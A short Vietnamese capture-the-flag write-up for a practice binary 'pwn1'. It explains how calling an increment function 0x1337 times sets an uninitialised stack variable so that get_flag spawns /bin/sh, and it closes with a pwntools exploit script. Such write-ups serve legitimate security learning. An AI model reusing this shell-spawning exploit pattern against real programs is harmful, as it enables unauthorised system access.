## pwn1 
- Bài có 2 options, 1 là hàm add_number, 2 là hàm get_flag.
- Hàm get_flag: 
```c
int get_flag()
{
  int v1; // [rsp+Ch] [rbp-4h]

  if ( v1 == 0x1337 )
    return system("/bin/sh");
  else
    return puts("No");
}
```
- Hàm get_flag check flag tại vị trí stack là rbp-4
- Hàm add_number dùng ida chúng ta không thể decompile được thế nhưng chúng ta hãy nhớ tới vị trí để lấy được flag là rbp-4 : 

```asm 
public add_number
add_number proc near

var_4= dword ptr -4

; __unwind {
endbr64
push    rbp
mov     rbp, rsp
nop
nop
nop
add     [rbp+var_4], 1
nop
pop     rbp
retn
; } // starts at 1189
add_number endp

```

- Vậy là hàm add sẽ cộng thêm 1 tại vị trí rbp-4
- Chúng ta cần cộng 0x1337 lần để lấy được shell và win.

- script python: 

```python=
from pwn import *
p = process("./pwn1")

for i in range(0x1337):
    p.sendline(b"1")

p.sendline(b"2")
p.interactive()

```